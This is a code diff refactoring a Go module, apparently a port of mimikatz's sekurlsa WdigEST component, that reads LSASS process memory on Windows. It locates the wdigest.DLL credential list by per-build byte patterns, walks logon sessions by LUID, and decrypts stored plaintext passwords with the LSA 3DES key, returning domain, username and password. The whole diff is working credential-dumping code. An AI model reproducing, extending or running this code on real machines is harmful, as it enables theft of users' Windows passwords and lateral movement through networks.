@@ -2,8 +2,9 @@ package kiwi
 
 import (
 	"bytes"
-	"fmt"
 	"reflect"
+	"runtime"
+	"sync"
 	"time"
 	"unicode/utf16"
 	"unsafe"
@@ -15,6 +16,27 @@ import (
 	"project/internal/module/windows/api"
 )
 
+type wdigest struct {
+	ctx *Kiwi
+
+	primaryOffset int
+	credAddress   uintptr
+
+	mu sync.Mutex
+}
+
+func newWdigest(ctx *Kiwi) *wdigest {
+	return &wdigest{ctx: ctx}
+}
+
+func (wdigest *wdigest) logf(lv logger.Level, format string, log ...interface{}) {
+	wdigest.ctx.logger.Printf(lv, "kiwi-wdigest", format, log...)
+}
+
+func (wdigest *wdigest) log(lv logger.Level, log ...interface{}) {
+	wdigest.ctx.logger.Println(lv, "kiwi-wdigest", log...)
+}
+
 // reference:
 // https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.c
 
@@ -22,8 +44,9 @@ var (
 	patternWin5xX64PasswordSet = []byte{0x48, 0x3B, 0xDA, 0x74}
 	patternWin6xX64PasswordSet = []byte{0x48, 0x3B, 0xD9, 0x74}
 	// key = build version
-	wdigestReferencesX64 = map[uint32]*patchGeneric{
-		buildWinXP: {
+	wdigestReferencesX64 = []*patchGeneric{
+		{
+			minBuild: buildWinXP,
 			search: &patchPattern{
 				length: len(patternWin5xX64PasswordSet),
 				data:   patternWin5xX64PasswordSet,
@@ -31,7 +54,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: -4, off1: 36},
 		},
-		buildWin2003: {
+		{
+			minBuild: buildWin2003,
 			search: &patchPattern{
 				length: len(patternWin5xX64PasswordSet),
 				data:   patternWin5xX64PasswordSet,
@@ -39,7 +63,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: -4, off1: 48},
 		},
-		buildWinVista: {
+		{
+			minBuild: buildWinVista,
 			search: &patchPattern{
 				length: len(patternWin6xX64PasswordSet),
 				data:   patternWin6xX64PasswordSet,
@@ -57,8 +82,9 @@ var (
 	patternWin64X86PasswordSet      = []byte{0x74, 0x15, 0x8B, 0x0F, 0x39, 0x4E, 0x10}
 	patternWin10v1809X86PasswordSet = []byte{0x74, 0x15, 0x8b, 0x17, 0x39, 0x56, 0x10}
 	// key = build version
-	wdigestReferencesX86 = map[uint32]*patchGeneric{
-		buildWinXP: {
+	wdigestReferencesX86 = []*patchGeneric{
+		{
+			minBuild: buildWinXP,
 			search: &patchPattern{
 				length: len(patternWin5xX86PasswordSet),
 				data:   patternWin5xX86PasswordSet,
@@ -66,7 +92,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: -6, off1: 36},
 		},
-		buildWin2003: {
+		{
+			minBuild: buildWin2003,
 			search: &patchPattern{
 				length: len(patternWin5xX86PasswordSet),
 				data:   patternWin5xX86PasswordSet,
@@ -74,7 +101,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: -6, off1: 28},
 		},
-		buildWinVista: {
+		{
+			minBuild: buildWinVista,
 			search: &patchPattern{
 				length: len(patternWin60X86PasswordSet),
 				data:   patternWin60X86PasswordSet,
@@ -82,7 +110,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: -6, off1: 32},
 		},
-		buildMinWinBlue: {
+		{
+			minBuild: buildMinWinBlue,
 			search: &patchPattern{
 				length: len(patternWin63X86PasswordSet),
 				data:   patternWin63X86PasswordSet,
@@ -90,7 +119,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: -4, off1: 32},
 		},
-		buildMinWin10: {
+		{
+			minBuild: buildMinWin10,
 			search: &patchPattern{
 				length: len(patternWin64X86PasswordSet),
 				data:   patternWin64X86PasswordSet,
@@ -98,7 +128,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: -6, off1: 32},
 		},
-		buildWin10v1809: {
+		{
+			minBuild: buildWin10v1809,
 			search: &patchPattern{
 				length: len(patternWin10v1809X86PasswordSet),
 				data:   patternWin10v1809X86PasswordSet,
@@ -109,34 +140,44 @@ var (
 	}
 )
 
-func (kiwi *Kiwi) searchWdigestCredentialAddress(pHandle windows.Handle) error {
-	wdigest, err := kiwi.lsass.GetBasicModuleInfo(pHandle, "wdigest.DLL")
+func (wdigest *wdigest) searchAddresses(pHandle windows.Handle) error {
+	module, err := wdigest.ctx.lsass.GetBasicModuleInfo(pHandle, "wdigest.DLL")
 	if err != nil {
 		return err
 	}
 	// read wdigest.dll memory
-	memory := make([]byte, wdigest.size)
-	_, err = api.ReadProcessMemory(pHandle, wdigest.address, &memory[0], uintptr(wdigest.size))
+	memory := make([]byte, module.size)
+	size := uintptr(module.size)
+	_, err = api.ReadProcessMemory(pHandle, module.address, &memory[0], size)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read memory about wdigest.DLL")
 	}
 	// search logon session list pattern
-	patch := wdigestReferencesX64[buildWinVista]
+	var patches []*patchGeneric
+	switch runtime.GOARCH {
+	case "386":
+		patches = wdigestReferencesX86
+	case "amd64":
+		patches = wdigestReferencesX64
+	}
+	_, _, build := wdigest.ctx.getWindowsVersion()
+	patch := selectGenericPatch(patches, build)
 
 	index := bytes.Index(memory, patch.search.data)
 	if index == -1 {
 		return errors.WithMessage(err, "failed to search wdigest primary pattern")
 	}
-	address := wdigest.address + uintptr(index+patch.offsets.off0)
+	address := module.address + uintptr(index+patch.offsets.off0)
 	var offset int32
-	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
+	size = unsafe.Sizeof(offset)
+	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read offset about wdigest credential address")
 	}
-	wdigestCredAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
-	kiwi.logf(logger.Debug, "wdigest credential address is 0x%X", wdigestCredAddr)
-	kiwi.wdigestPrimaryOffset = patch.offsets.off1
-	kiwi.wdigestCredAddr = wdigestCredAddr
+	credAddress := address + unsafe.Sizeof(offset) + uintptr(offset)
+	wdigest.logf(logger.Debug, "credential address is 0x%X", credAddress)
+	wdigest.primaryOffset = patch.offsets.off1
+	wdigest.credAddress = credAddress
 	return nil
 }
 
@@ -158,23 +199,22 @@ type Wdigest struct {
 	Password string
 }
 
-func (kiwi *Kiwi) getWdigestList(pHandle windows.Handle, logonID windows.LUID) ([]*Wdigest, error) {
-	kiwi.mu.Lock()
-	defer kiwi.mu.Unlock()
-	if kiwi.wdigestCredAddr == 0 {
-		err := kiwi.searchWdigestCredentialAddress(pHandle)
+func (wdigest *wdigest) GetPassword(pHandle windows.Handle, logonID windows.LUID) (*Wdigest, error) {
+	wdigest.mu.Lock()
+	defer wdigest.mu.Unlock()
+	if wdigest.credAddress == 0 {
+		err := wdigest.searchAddresses(pHandle)
 		if err != nil {
 			return nil, errors.WithMessage(err, "failed to search wdigest credential address")
 		}
 	}
-	address := kiwi.wdigestCredAddr
 	// read wdigest credential data address
+	address := wdigest.credAddress
 	var addr uintptr
 	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&addr)), unsafe.Sizeof(addr))
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to read wdigest credential list address")
 	}
-	kiwi.logf(logger.Debug, "wdigest credential data address is 0x%X", addr)
 	// read linked list address by LUID
 	ticker := time.NewTicker(3 * time.Millisecond)
 	defer ticker.Stop()
@@ -183,15 +223,14 @@ func (kiwi *Kiwi) getWdigestList(pHandle windows.Handle, logonID windows.LUID) (
 		// prevent dead loop
 		select {
 		case <-ticker.C:
-		case <-kiwi.context.Done():
-			return nil, kiwi.context.Err()
+		case <-wdigest.ctx.context.Done():
+			return nil, wdigest.ctx.context.Err()
 		}
-
 		if addr == address {
 			break
 		}
-		size := unsafe.Offsetof(wdigestListEntry{}.luid) + unsafe.Sizeof(windows.LUID{})
 		var entry wdigestListEntry
+		size := unsafe.Offsetof(wdigestListEntry{}.luid) + unsafe.Sizeof(windows.LUID{})
 		_, err = api.ReadProcessMemory(pHandle, addr, (*byte)(unsafe.Pointer(&entry)), size)
 		if err != nil {
 			break
@@ -202,63 +241,61 @@ func (kiwi *Kiwi) getWdigestList(pHandle windows.Handle, logonID windows.LUID) (
 		}
 		addr = entry.fLink
 	}
-	fmt.Printf("0x%X\n", resultAddr)
-
+	if resultAddr == 0x00 { // not found
+		return nil, nil
+	}
+	wdigest.logf(logger.Debug, "found credential at address: 0x%X", resultAddr)
+	// read primary credential
 	var cred genericPrimaryCredential
-	credAddr := uintptr(int(addr) + kiwi.wdigestPrimaryOffset)
-	size := uintptr(kiwi.wdigestPrimaryOffset + int(unsafe.Sizeof(cred)))
+	credAddr := uintptr(int(resultAddr) + wdigest.primaryOffset)
+	size := uintptr(wdigest.primaryOffset + int(unsafe.Sizeof(cred)))
 	_, err = api.ReadProcessMemory(pHandle, credAddr, (*byte)(unsafe.Pointer(&cred)), size)
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to read wdigest primary credential")
 	}
-
-	domain, err := api.ReadLSAUnicodeString(pHandle, &cred.Domain)
-
 	username, err := api.ReadLSAUnicodeString(pHandle, &cred.Username)
-
-	if username == "" {
-		return nil, nil
+	if err != nil {
+		return nil, errors.WithMessage(err, "failed to read wdigest credential username")
 	}
-
+	// if username == "" {
+	// 	return nil, nil
+	// }
+	domain, err := api.ReadLSAUnicodeString(pHandle, &cred.Domain)
+	if err != nil {
+		return nil, errors.WithMessage(err, "failed to read wdigest credential domain")
+	}
+	w := Wdigest{
+		Domain:   domain,
+		Username: username,
+	}
 	// read encrypted password
 	lus := cred.Password
 	if lus.MaximumLength != 0 {
-		data := make([]byte, int(lus.MaximumLength))
-		_, err := api.ReadProcessMemory(pHandle, lus.Buffer, &data[0], uintptr(lus.MaximumLength))
+		encPassword := make([]byte, int(lus.MaximumLength))
+		size = uintptr(lus.MaximumLength)
+		_, err = api.ReadProcessMemory(pHandle, lus.Buffer, &encPassword[0], size)
 		if err != nil {
-
+			return nil, errors.WithMessage(err, "failed to read wdigest credential encrypted password")
 		}
-		fmt.Println(data)
-
-		pwd := make([]byte, len(data))
-
+		pwd := make([]byte, len(encPassword))
 		// iv will be changed, so we need copy
 		// TODO call function
 		iv := make([]byte, 8)
-		copy(iv, kiwi.lsaNT6.iv[:8])
-
-		api.BCryptDecrypt(kiwi.lsaNT6.key3DES, data, 0, iv, pwd)
-
+		copy(iv, wdigest.ctx.lsaNT6.iv[:8])
+		_, err = api.BCryptDecrypt(wdigest.ctx.lsaNT6.key3DES, encPassword, 0, iv, pwd)
+		if err != nil {
+			return nil, errors.WithMessage(err, "failed to decrypt wdigest credential password")
+		}
 		var utf16Str []uint16
 		sh := (*reflect.SliceHeader)(unsafe.Pointer(&utf16Str))
 		sh.Len = int(lus.Length / 2)
 		sh.Cap = int(lus.Length / 2)
 		sh.Data = uintptr(unsafe.Pointer(&pwd[0]))
-
-		fmt.Println(pwd)
-		fmt.Println(len(utf16.Decode(utf16Str)))
-
-		fmt.Println("final password:", string(utf16.Decode(utf16Str)))
+		w.Password = string(utf16.Decode(utf16Str))
 	}
+	return &w, nil
+}
 
-	password, err := api.ReadLSAUnicodeString(pHandle, &cred.Password)
-
-	// decrypt password
-
-	fmt.Println("Domain:", domain)
-	fmt.Println("Username:", username)
-	fmt.Println("Password:", password)
-
-	return nil, nil
-
+func (wdigest *wdigest) Close() {
+	wdigest.ctx = nil
 }
